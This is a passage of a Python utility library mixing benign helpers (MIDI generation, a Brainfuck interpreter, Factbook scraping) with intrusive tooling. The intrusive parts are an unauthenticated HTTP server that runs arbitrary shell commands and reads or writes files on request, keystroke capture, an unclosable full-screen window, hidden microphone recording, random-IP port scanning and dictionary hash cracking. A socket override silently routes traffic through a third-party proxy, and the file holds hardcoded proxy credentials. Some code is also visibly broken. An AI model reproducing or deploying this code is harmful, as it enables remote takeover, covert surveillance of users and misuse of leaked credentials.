            location = recv[1].split("Location: ")[1].split("\r\n")[0]
            conn, target, port, path = self.ext_url(location)
            try:
                recv = self.getdownload(user, conn, target, port,
                                        location, output=output)
                file.write("\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:]))
            except Exception as e:
                file.write(f"Error: {e}")
        elif recv[0] == 200:
            file.write("\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:]))
        else:
            file.write(f"Error: {recv[0]} {recv[1]}")
        file.close()

    def send(self, user, type, data, url):  # Send a data to target
        conn, target, port, path = self.ext_url(url)
        try:
            if type == "form":
                recv = self.wwwform(user, conn, target, port, path, data)
            else:
                recv = self.post(user, conn, target, port, path, data)
        except Exception as e:
            recv = (0, str(e))
        if recv[0] == 301:
            location = recv[1].split("Location: ")[1].split("\r\n")[0]
            conn, target, port, path = self.ext_url(location)
            try:
                if type == "form":
                    recv = self.wwwform(user, conn, target,
                                        port, location, data)
                else:
                    recv = self.post(user, conn, target, port, location, data)
                return "\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:])
            except Exception as e:
                return f"Error: {e}"
        elif recv[0] in [200, 201]:
            return "\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:])
        else:
            return f"Error: {recv[0]} {recv[1]}"

    # Search with the system (using web scraping; uses Bing and google searching)
    def search(self, user, query, count):
        founds = []
        try:
            from bs4 import BeautifulSoup
        except:
            try:
                subprocess.run(f"pip install bs4",
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        content = self.open(
            user, f"https://www.bing.com/search?q={query}&count={count}")
        soup = BeautifulSoup(content, "html.parser")
        results = soup.find_all("li", class_="b_algo")
        for result in results:
            try:
                url = result.find("a").get("href")
                founds.append(url)
            except:
                pass
        if len(founds) < count:
            required = count-len(founds)
            try:
                from googlesearch import search
            except:
                try:
                    subprocess.run("pip install google".split(
                    ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except:
                    pass
                from googlesearch import search
            try:
                for url in search(query, num_results=required):
                    founds.append(url)
            except:
                for url in founds:
                    if required >= 1:
                        founds.append(url)
                        required -= 1
                    else:
                        break
        self.users[user]["last"] = self.users[user]["last"] + \
            [f"SEARCHED: {query} (NUM OF RESULT: {count})"]
        return founds

    # Creates locations that require full connectivity (example: "/main.html" becomes "http://example.com/main.html/")
    def restoreLocs(self, mainurl, content):
        if mainurl[len(mainurl)-1] == "/":
            mainurl = mainurl[0:len(mainurl)-1]
        conn, target, port, path = self.ext_url(mainurl)
        mainurl = f"{conn}://{target}"
        return content.replace(f"'/", f"'{mainurl}/").replace(f'"/', f'"{mainurl}/')


class SimonicMusic:
    def __init__(self):
        self.code = []
        self.tempo = 100

    def add(self, code):  # "Track/Pitch/Duration/Volume" or use "null" to wait
        self.code.append(code)

    def save(self, file):
        from midiutil import MIDIFile
        tracks = 0
        for h in self.code:
            h = h.split("/")[0]
            if h == "null":
                pass
            else:
                if int(h) >= tracks:
                    tracks = int(h)
        midi = MIDIFile(tracks+1)
        time = 0
        track = 0
        for h in self.code:
            if h == "null":
                midi.addProgramChange(0, 0, time, 0)
                midi.addNote(track, 0, 0, time, 1, 0)
                time += 100/self.tempo
            else:
                h = h.split("/")
                track = int(h[0])
                midi.addProgramChange(0, 0, time, track)
                pitch = int(h[1])
                dur = float(h[2])
                volume = int(h[3])
                midi.addNote(track, 0, pitch, time, dur, volume)
                time += 100/self.tempo
        with open(file, "wb") as f:
            midi.writeFile(f)


class Hash:
    def __init__(self):
        import hashlib
        self.lib = hashlib
        self.hasherList = {"md5": {"length": 32}, "md4": {"length": 32}, "sha224": {"length": 56}, "ripemd160": {"length": 40}, "whirlpool": {"length": 128}, "sha512_224": {"length": 56}, "sha512": {"length": 128}, "sha3_512": {"length": 128}, "sha3_256": {"length": 64}, "blake2b": {
            "length": 128}, "md5-sha1": {"length": 72}, "sha3_224": {"length": 56}, "sha1": {"length": 40}, "sha3_384": {"length": 96}, "blake2s": {"length": 64}, "sha256": {"length": 64}, "sha384": {"length": 96}, "sha512_256": {"length": 64}, "mdc2": {"length": 32}, "sm3": {"length": 64}}

    def hash(self, algorithm, text):
        if algorithm in self.hasherList:
            return self.lib.new(algorithm, text.encode()).hexdigest()
        else:
            ImportError("Algorithm is invalid.")

    def detectAlgo(self, hash):
        algo = []
        for item, value in self.hasherList.items():
            if len(hash) == value["length"]:
                algo.append(item)
        return algo

    def breakHash(self, hash):
        try:
            import nltk
        except:
            try:
                subprocess.run(f"pip install nltk",
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import nltk
        hashs = self.detectAlgo(hash)
        nltk.download("words")
        from nltk.corpus import words
        words = words.words()+["fuck", "stfu", "meme", "fucking"]+hashs
        import time
        perwait = 0
        for hashtype in hashs:
            f = time.time()
            test = self.hash(hashtype, "Test123")
            e = time.time()
            perwait += e-f
            perwait = perwait/len(hashs)
            maxy = len(words)*len(hashs)
            miny = 0
            for word in words:
                for hashtype in hashs:
                    minute = ((maxy-miny)*perwait)/60
                    y = (miny/maxy)*100
                    print(f"Trying words... {y:.2f}% {minute:.2f} Minute left")
                    miny += 1
                    if self.hash(hashtype, word) == hash:
                        return (hashtype, word)
            maxy = 10000*len(hashs)
            miny = 0
            for h in range(10000):
                h = str(h)
                for hashtype in hashs:
                    minute = ((maxy-miny)*perwait)/60
                    y = (miny/maxy)*100
                    print(f"Trying numbers... {y:.2f}% {
                          minute:.2f} Minute left")
                    miny += 1
                    if self.hash(hashtype, h) == hash:
                        return (hashtype, h)
            maxy = len(words)*len(hashs)*100
            miny = 0
            hh = range(100)
            for word in words:
                for hashtype in hashs:
                    for h in hh:
                        minute = ((maxy-miny)*perwait)/60
                        h = str(h)
                        y = (miny/maxy)*100
                        print(
                            f"Trying words+numbers... {y:.2f}% {minute:.2f} Minute left")
                        miny += 1
                        if self.hash(hashtype, word+h) == hash:
                            return (hashtype, word+h)
            maxy = len(words)*len(hashs)*100
            miny = 0
            hh = range(100)
            for word in words:
                for hashtype in hashs:
                    for h in hh:
                        minute = ((maxy-miny)*perwait)/60
                        h = str(h)
                        y = (miny/maxy)*100
                        print(
                            f"Trying numbers+words... {y:.2f}% {minute:.2f} Minute left")
                        miny += 1
                        if self.hash(hashtype, h+word) == hash:
                            return (hashtype, h+word)
            return (hashtype[0], "")

class CIA_Database:
	def __init__(self):
		try:
			import requests
		except:
			try:
				subprocess.run("pip install requests".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
		self.path = "https://www.cia.gov/the-world-factbook/countries/"
		self.requests = requests
	def find_photos(self, content):
		urls = []
		content = content.split('''loading="lazy" src="''')
		del content[0]
		for url in content:
			url = url.split('"')[0]
			if url[0] == "/":
				url = "https://www.cia.gov"+url
			urls.append(url)
		return urls
	def find_flagtext(self, content):
		text = content.split('''block-caption">''')
		del text[0]
		text = text[0]
		text = text.split("<br/>")[0].split("</div>")[0]
		return text
	def find_flag(self, content):
		text = content.split('''604px" srcset="''')
		del text[0]
		text = text[0]
		text = text.split(' ')[0].split('"')[0]
		return "https://www.cia.gov"+text
	def find_area(self, content):
		text = content.split('''<strong>total:</strong>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_bg(self, content):
		text = content.split('''>Background</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_climate(self, content):
		text = content.split('''>Climate</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_resources(self, content):
		text = content.split('''>Natural resources</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_pop(self, content):
		text = content.split('''>Population</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_langs(self, content):
		text = content.split('''>Languages</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_religions(self, content):
		text = content.split('''>Religions</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_capital(self, content):
		text = content.split('''>Capital</h3><p><strong>name:</strong> ''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_chief(self, content):
		text = content.split('''<strong>chief of state:</strong>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def find_head(self, content):
		text = content.split('''<strong>head of government:</strong> ''')
		del text[0]
		text = text[0]
		text = text.split('<p>')[0].split("<br/>")[0]
		return text
	def find_gdp(self, content):
		text = content.split('''sing power parity)</h3><p>''')
		del text[0]
		text = text[0]
		text = text.split('<br/>')[0]
		return text
	def get(self, country):
		country = country.lower()
		gallery = self.requests.get(self.path+country+"/images").text
		flag = self.requests.get(self.path+country+"/flag").text
		summaries = self.requests.get(self.path+country+"/summaries").text
		data = {}
		try:
			data["photos"] = self.find_photos(gallery)
		except:
			pass
		try:
			data["flag_text"] = self.find_flagtext(flag)
		except:
			pass
		try:
			data["flag"] = self.find_flag(flag)
		except:
			pass
		try:
			data["area"] = self.find_area(summaries)
		except:
			pass
		try:
			data["background"] = self.find_bg(summaries)
		except:
			pass
		try:
			data["climate"] = self.find_climate(summaries)
		except:
			pass
		try:
			data["resources"] = self.find_resources(summaries)
		except:
			pass
		try:
			data["population"] = self.find_pop(summaries)
		except:
			pass
		try:
			data["languages"] = self.find_langs(summaries)
		except:
			pass
		try:
			data["religions"] = self.find_religions(summaries)
		except:
			pass
		try:
			data["capital"] = self.find_capital(summaries)
		except:
			pass
		try:
			data["chief"] = self.find_chief(summaries)
		except:
			pass
		try:
			data["head"] = self.find_head(summaries)
		except:
			pass
		try:
			data["gdp"] = self.find_gdp(summaries)
		except:
			pass
		return data
def aimusic(file, length, tempo, dur, tracks, noteadd=0):
    smsc = SimonicMusic()
    smsc.tempo = tempo
    if tracks == "guitar":
        tracks = range(24, 31)
    elif tracks == "piano":
        tracks = range(0, 7)
    elif tracks == "bass":
        tracks = range(32, 39)
    elif tracks == "violin":
        tracks = range(40, 47)
    elif tracks == "flute":
        tracks = range(72, 79)
    elif tracks == "trumpet":
        tracks = range(56, 63)
    elif tracks == "drum":
        tracks = [0, 8, 16, 24, 25, 32, 40, 48]
    elif tracks == "trap":
        tracks = [36, 38, 39, 42, 40, 41, 43]
    elif tracks == "lofi":
        tracks = [56, 57, 44]
    for _ in range(length):
        codes = []
        chc = random.randint(1, 6)
        if chc == 1:
            n = random.choice(tracks)
            n2 = random.choice(tracks)
            note = random.randint(60, 72)+noteadd
            for _ in range(random.randint(2, 5)):
                codes.append(f"{n}/{note}/{dur}/100")
                note += random.randint(1, 2)
                codes.append(f"{n2}/{note}/{dur}/100")
                note += random.randint(1, 2)
            codes.append(f"{n}/{note}/{dur}/100")
            note -= random.randint(1, 2)
            codes.append(f"{n2}/{note}/{dur}/100")
            note -= random.randint(1, 2)
        elif chc == 2:
            n = random.choice(tracks)
            n2 = random.choice(tracks)
            note = random.randint(60, 72)+noteadd
            for _ in range(random.randint(2, 5)):
                codes.append(f"{n}/{note}/{dur}/100")
                note -= random.randint(1, 2)
                codes.append(f"{n2}/{note}/{dur}/100")
                note -= random.randint(1, 2)
            codes.append(f"{n}/{note}/{dur}/100")
            note += random.randint(1, 2)
            codes.append(f"{n2}/{note}/{dur}/100")
            note += random.randint(1, 2)
        elif chc == 3:
            n = random.choice(tracks)
            n2 = random.choice(tracks)
            note = random.randint(60, 72)+noteadd
            for _ in range(random.randint(5, 8)):
                codes.append(f"{n}/{note}/{dur}/100")
                note -= random.randint(1, 2)
                codes.append(f"{n2}/{note}/{dur}/70")
                note += random.randint(1, 2)
            h = random.randint(0, 1)
            if h == 0:
                codes.append(f"{n}/{note}/{dur}/100")
                codes.append(f"{n}/{note}/{dur}/100")
                codes.append(f"{n2}/{note}/{dur}/100")
                codes.append(f"{n}/{note}/{dur}/100")
            else:
                codes.append(f"{n2}/{note}/{dur}/100")
                codes.append(f"{n2}/{note}/{dur}/100")
                codes.append(f"{n}/{note}/{dur}/100")
                codes.append(f"{n2}/{note}/{dur}/100")
        elif chc == 4:
            n = random.choice(tracks)
            for _ in range(random.randint(1, 5)):
                note = random.randint(60, 72)+noteadd
                codes.append(f"{n}/{note}/{dur}/100")
        elif chc == 5:
            n = random.choice(tracks)
            n2 = random.choice(tracks)
            note = random.randint(60, 72)+noteadd
            for _ in range(random.randint(2, 4)):
                h = random.randint(0, 1)
                if h == 0:
                    codes.append(f"{n}/{note}/{dur}/100")
                    codes.append(f"{n}/{note}/{dur}/100")
                    codes.append(f"{n2}/{note}/{dur}/100")
                    codes.append(f"{n}/{note}/{dur}/100")
                else:
                    codes.append(f"{n2}/{note}/{dur}/100")
                    codes.append(f"{n2}/{note}/{dur}/100")
                    codes.append(f"{n}/{note}/{dur}/100")
                    codes.append(f"{n2}/{note}/{dur}/100")
                note += random.randint(-1, 1)
        else:
            codes.append("null")
        for code in codes:
            smsc.add(code)
    smsc.save(file)


def runUserCmd(code):
    global output
    if os.name == "nt":
        subprocess.run(["cmd", "/C", code], stdout=output, stderr=output)
    else:
        subprocess.run(["/bin/bash", "-c", code], stdout=output, stderr=output)


def keyinput(varname):
    global vars
    with lock:
        vars[varname] = ""
    while True:
        runCode(f"keylog;{varname}-KeyInputSys")
        char = vars[varname+"-KeyInputSys"]
        if char == "space":
            with lock:
                vars[varname] = str(vars[varname]+" ")
        elif char == "backspace":
            try:
                with lock:
                    vars[varname] = str(vars[varname][:len(vars[varname])-1])
            except:
                pass
        elif char == "enter":
            del vars[varname+"-KeyInputSys"]
            break
        else:
            if len(char) == 1:
                with lock:
                    vars[varname] = str(vars[varname]+char)
        runCode("wait;0.1399")


def UnCloseSys():
    pass


def fullBox(bg, fg, text):
    try:
        subprocess.run("pip install "+"tkinter".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    exec(f"""import tkinter as tk
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg=bg)
root.title("UnknowScreen")
label = tk.Label(root, text='''{text}''', fg='''{fg}''', bg='''{bg}''')
label.pack(expand=True)
root.mainloop()""")


def fullBoxUnClose(bg, fg, text):
    try:
        subprocess.run("pip install "+"tkinter".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    exec(f"""import tkinter as tk
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg=bg)
root.title("UnknowScreen")
label = tk.Label(root, text='''{text}''', fg='''{fg}''', bg='''{bg}''')
label.pack(expand=True)
root.protocol("WM_DELETE_WINDOW", UnCloseSys)
root.mainloop()""")


def listenMic(duration, file):
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
    except:
        try:
            subprocess.run("pip install sounddevice scipy".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import sounddevice as sd
        from scipy.io.wavfile import write
    sound = sd.rec(int(duration*44100), samplerate=44100, channels=2)
    sd.wait()
    write(file, 44100, sound)


def SimonCloudStart():
    global mods
    if 963 in mods:
        pass
    else:
        try:
            subprocess.run("pip install flask".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    from flask import Flask, request

    app = Flask(__name__)

    @app.route("/", methods=["GET"])
    def system():
        try:
            headers = request.headers
            c = headers.get("Command", "http")
            method = c.split(" ")[0]
            if method == "set":
                name = c.split(" ")[1]
                content = " ".join(c.split()[2:])
                with open(name, "w") as f:
                    f.write(content)
                return "s"
            elif method == "get":
                name = c.split(" ")[1]
                with open(name, "r") as f:
                    return f.read()
            elif method == "com":
                cc = c.split(" ")[1:]
                try:
                    text = subprocess.run(
                        cc, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    text = text.stdout + " " + text.stderr
                except Exception as e:
                    text = e
                return str(text)
        except:
            return "error"

    if __name__ == "__main__":
        app.run(debug=True)


def gc_test(ports):
    global gctrue, gcfalse
    ip = str(random.randint(0, 255))+"."+str(random.randint(0, 255)) + \
        "."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
    ok = False
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, int(port)))
            ok = True
        except:
            pass
        finally:
            s.close()
    if ok:
        with lock:
            gctrue += 1
    else:
        with lock:
            gcfalse += 1


def gc_tester(num, ports):
    global gctrue, gcfalse
    with lock:
        gctrue = 0
        gcfalse = 0
    ts = []
    for n in range(num):
        t = threading.Thread(target=gc_test, args=(ports,))
        ts.append(t)
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return (gctrue/gcfalse)


def gc_how(num):
    return 4228250625*num


def gc_get(trueLevel, ports):
    results = []
    n = 0
    for _ in range(trueLevel):
        result = gc_tester(500, ports)
        results.append(result)
        n += result
    n = n/len(results)
    many = int(gc_how(n))
    return many


class SimonicRadio:
    def __init__(self):
        pass

    def encode(self, pack):
        converter = {}
        hr = "0123456789"
        n = 0
        for h in hr:
            for h2 in hr:
                for h3 in hr:
                    for h4 in hr:
                        converter[chr(n)] = h+h2+h3+h4
                        n += 1
        text = []
        for h in pack:
            if h in converter:
                text.append(converter[h])
        return ".".join(text)

    def decode(self, pack):
        converter = {}
        hr = "0123456789"
        n = 0
        for h in hr:
            for h2 in hr:
                for h3 in hr:
                    for h4 in hr:
                        converter[h+h2+h3+h4] = chr(n)
                        n += 1
        text = ""
        for h in pack.split("."):
            text += converter[h]
        return text

    def createPack(self, channel, data):
        pack = f"{channel}{chr(0)}{chr(5)}\n{data}"
        return "+"+self.encode(pack)

    def getall(self, s):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        return recv.decode("utf-8", errors="ignore")

    def sendSignal(self, channel, data):
        import socket
        s = socket.socket()
        s.settimeout(2)
        s.connect(("simonicproxy.pythonanywhere.com", 80))
        pack = self.createPack(channel, data)
        s.sendall(
            f"GET / HTTP/1.1\r\nHost: simonicproxy.pythonanywhere.com\r\nSignal: {pack}\r\n\r\n".encode())
        recv = self.getall(s)
        try:
            data = recv.split("\r\n\r\n")[1]
        except:
            data = ""
        s.close()
        return data


class SimonCloud:
    def __init__(self, target, port=80):
        self.s = socket.socket()
        self.s.settimeout(0.5)
        self.s.connect((target, port))
        self.t = target
        self.p = port

    def set(self, name, content):  # Data Seting
        content = content.replace("\n", "/n/*")
        p = f"""GET / HTTP/1.1\r\nHost: {self.t}:{
            self.p}\r\nCommand: set {name} {content}\r\n\r\n""".encode()
        self.s.sendall(p)

    def get(self, name):  # Data Geting
        p = f"""GET / HTTP/1.1\r\nHost: {self.t}:{
            self.p}\r\nCommand: get {name}\r\n\r\n""".encode()
        self.s.sendall(p)

    def com(self, c):  # Bash Command Runner
        p = f"""GET / HTTP/1.1\r\nHost: {self.t}:{
            self.p}\r\nCommand: com {c}\r\n\r\n""".encode()
        self.s.sendall(p)

    def recv(self):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        recv = recv.decode("utf-8", errors="ignore")
        return recv.split("\r\n\r\n")[1].replace("/n/*", "\n")


class SimonicNet:
    def __init__(self, target="simonserver.pythonanywhere.com", port=80):
        self.target = target
        self.port = port

    def getall(self, s):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        return recv.decode("utf-8", errors="ignore")

    def Create(self, ip, pawd):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Create/{ip}/{pawd}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv

    def SetFile(self, ip, pawd, file, c):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: SetFile/{ip}/{pawd}/{file}\r\nContent: {c}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv

    def GetFile(self, ip, pawd, file):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetFile/{ip}/{pawd}/{file}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv.replace("/n/*", "\n")

    def SetOpenFile(self, ip, pawd, file, c):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: SetOpenFile/{ip}/{pawd}/{file}\r\nContent: {c}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv

    def GetOpenFile(self, ip, file):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetOpenFile/{ip}/{file}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv.replace("/n/*", "\n")

    def Open(self, ip):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Open/{ip}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv.replace("/n/*", "\n")

    def GetAll(self, ip, pawd):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetAll/{ip}/{pawd}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv

    def WebOpenSys(self, ip):
        server = "127."+str(random.randint(0, 255))+"." + \
            str(random.randint(0, 255))+"."+str(random.randint(0, 255))
        port = random.randint(1025, 65535)
        s = socket.socket()
        s.bind((server, port))
        s.listen(100000)
        webbrowser.open(f"http://{server}:{port}")
        while True:
            try:
                c, a = s.accept()
                path = c.recv(1024).decode().split(" ")[1]
                if path == "/":
                    pack = self.Open(ip).split("\r\n\r\n")[1]
                    pack = f"""HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {
                        len(pack)}\r\n\r\n"""+pack
                    c.send(pack.encode())
                else:
                    pack = self.GetOpenFile(
                        ip, path.replace("/", "")).split("\r\n\r\n")[1]
                    pack = f"""HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {
                        len(pack)}\r\n\r\n"""+pack
                    c.send(pack.encode())
            except Exception as e:
                print(e)

    def WebOpen(self, ip):
        threading.Thread(target=self.WebOpenSys, args=(ip,)).start()

    def Search(self, query, num):
        s = socket.socket()
        s.settimeout(2)
        s.connect((self.target, self.port))
        s.sendall(
            f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Search/{query}/{num}\r\n\r\n".encode())
        recv = self.getall(s)
        return recv


def runBF(length, code):
    tape = [0] * length
    pointer = 0
    output = ''
    loop_stack = []
    i = 0
    while i < len(code):
        command = code[i]
        if command == '>':
            pointer += 1
        elif command == '<':
            pointer -= 1
        elif command == '+':
            tape[pointer] = (tape[pointer] + 1) % 256
        elif command == '-':
            tape[pointer] = (tape[pointer] - 1) % 256
        elif command == '.':
            output += chr(tape[pointer])
        elif command == ',':
            tape[pointer] = ord(input()[0])
        elif command == '[':
            if tape[pointer] == 0:
                loop_depth = 1
                while loop_depth != 0:
                    i += 1
                    if code[i] == '[':
                        loop_depth += 1
                    elif code[i] == ']':
                        loop_depth -= 1
        elif command == ']':
            if tape[pointer] != 0:
                loop_depth = 1
                while loop_depth != 0:
                    i -= 1
                    if code[i] == '[':
                        loop_depth -= 1
                    elif code[i] == ']':
                        loop_depth += 1
                i -= 1
        i += 1
    return output


# Internet access socket (TCP) with a completely hidden proxy (Not fast)
class NovaleusSock:
    def __init__(self, *args):
        self.target = ""
        self.port = 0
        self.recvv = ""
        self.ssl = False
        self.v = 0
        self.novaserver = "diyarbakir0askeri0cezaevi.pythonanywhere.com"
        self.novaport = 80
        import socket as virtualSockLib
        self.vsl = virtualSockLib
        self.s = self.vsl.socket()
        self.s.settimeout(3.5)

    def recvSys(self, s):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        return recv.decode("utf-8", errors="ignore")

    def bind(self, target):
        self.s.bind(target)

    def set_default_socket(self):
        socket.socket = NovaleusSock

    def set_virtual_socket(self):
        socket.socket = self.vsl.socket

    def connect(self, target):
        stest = self.vsl.socket().connect(target)
        self.target = target[0]
        self.port = target[1]

    def settimeout(self, n):
        self.s.settimeout(n)

    def create_ssl(self):
        self.ssl = True

    def remove_ssl(self):
        self.ssl = False

    def sendall(self, pack):
        self.recvv = ""
        self.v = 0
        data = {"key": "b4Kc7Dv9Gm3Pn6Js2Rf5Th8Yk1ZqAx0WlEqXoIpSrVuNyMtFwCgBdUoLiHpEjO",
                "ssl_use": self.ssl, "target": self.target, "port": self.port, "pack": pack}
        data = json.dumps(data)
        self.s.connect((self.novaserver, self.novaport))
        self.s.sendall(
            f"GET /9d7G3fR4t5H2j8k6L1zP0xQ1bVcXeYsTmFnZvAqWrUiOpDsJgKhClEwN HTTP/1.1\r\nHost: {self.novaserver}\r\ndata: {data}\r\n\r\n".encode())
        self.recvv = "\r\n\r\n".join(
            self.recvSys(self.s).split("\r\n\r\n")[1:])

    def recv(self):
        return self.recvv

    def close(self):
        try:
            self.s.close()
        except:
            pass
        del self


def randomProxy():
    from requests.auth import HTTPProxyAuth
    list = """45.95.148.7:8000
49shT6
RdAzxw

45.85.161.144:8000
hudWdY
JW3dr8

45.157.36.248:8000
HUgcwX
rRSNQH

38.170.100.122:8000
CnkoD0
rYQ3f1

38.148.143.64:8000
Bmtr4f
7fNjP5

138.219.72.201:8000
5GzQu1
UgnuNK

45.94.36.148:8000
NuzUxt
tjQzFu

45.133.220.123:8000
10xuSX
GWq2ZJ

196.17.171.103:8000
KkCMHH
53aav8

163.198.134.38:8000
Jd8odq
fscew2""".split("\n\n")
    choc = random.choice(list).split("\n")
    host = choc[0]
    user = choc[1]
    pawd = choc[2]
    return {"http": f"http://{host}/", "https": f"https://{host}/"}, HTTPProxyAuth(user, pawd)


def proxyGet0(targeturl):
    global mods, httpHeaders
    try:
        if 0 in mods:
            pass
        else:
            try:
                subprocess.run("pip install requests".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                with lock:
                    mods.append(0)
            except:
                pass
        import requests
        proxy, auth = randomProxy()
        text = requests.get(targeturl, headers=httpHeaders,
                            proxies=proxy, auth=auth, timeout=2).text
    except Exception as e:
        text = "error: "+str(e)
    return text


class SimonicDB:
    def __init__(self):
        self.dbcode = {}

    def db_oneway(self, text, length):
        newtext = ""
        for h in text:
            newtext += chr((ord(h)+length**2) % 1114111)*2
        newtext = newtext*length
        oneway = ""
        sbox = ""
        sbox_hr = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"
        for h in sbox_hr:
            sbox += sbox_hr[(ord(h)+len(text)**len(sbox)) % len(sbox_hr)]
        n = len(str(length))**4
        for h in newtext:
            oneway += sbox[(ord(h)**2+n) % len(sbox)]
            n += len(oneway)*len(text)
        return oneway[:length][::-1]

    def db_encrypt(self, text, pawd):
        pawd = self.db_oneway(pawd, len(pawd)*4)
        newtext = ""
        for h in text:
            newtext += chr((ord(h)+len(pawd)**2) % 1114111)
        jsontext = {"pawd": pawd, "text": newtext}
        text = ""
        for h in json.dumps(jsontext):
            text += chr((ord(h)+86262863826297927393628174927284849271838622348) % 1114111)
        return text

    def db_decrypt(self, text, pawd):
        pawd = self.db_oneway(pawd, len(pawd)*4)
        newtext = ""
        for h in text:
            newtext += chr((ord(h) -
                           86262863826297927393628174927284849271838622348) % 1114111)
        text = json.loads(newtext)
        if text["pawd"] == pawd:
            text = text["text"]
            newtext = ""
            for h in text:
                newtext += chr((ord(h)-len(pawd)**2) % 1114111)
            return (True, newtext)
        else:
            return (False, "")

    def add_data(self, name, text, encrypt=False, encrypt_pawd=".", oneway=False, oneway_length=64):
        if oneway:
            text = self.db_oneway(text, oneway_length)
        if encrypt:
            text = self.db_encrypt(text, encrypt_pawd)
        self.dbcode[name] = text

    def get_data(self, name, decrypt=False, decrypt_pawd="."):
        data = self.dbcode[name]
        if decrypt:
            test = self.db_decrypt(data, decrypt_pawd)
            if test[0]:
                return test[1]
            else:
                return ""
        else:
            return self.dbcode[name]

    def del_data(self, name):
        del self.dbcode[name]

    def save(self, file):
        with open(file, "w") as f:
            f.write(json.dumps(self.dbcode, indent=4))

    def load(self, file):
        with open(file, "r") as f:
            self.dbcode = json.loads(f.read())


class HttpServer:
    def __init__(self, host, port, apikey):
        self.s = socket.socket()
        self.s.bind((host, port))
        self.s.listen(999999)
        self.files = {"/": "<title> Empty </title>\n<h1> Empty Source </h1>"}
        self.ak = apikey

    def Path(self, path):
        if "://" in path:
            path = path.split("://")[1]
            rpath = "/"+("/".join(path.split("/")[1:]))
        else:
            rpath = path
        return rpath

    def Manage(self, pack):
        try:
            method = pack.split()[0]
            option = pack.split()[1]
            try:
                content = pack.split("\r\n\r\n")[1]
            except:
                content = ""
            try:
                ak = pack.split("Authorization: Bearer ")[1]
                ak = ak.split("\r\n")[0]
            except:
                ak = ""
        except:
            method = "GET"
            option = "/"
            content = ""
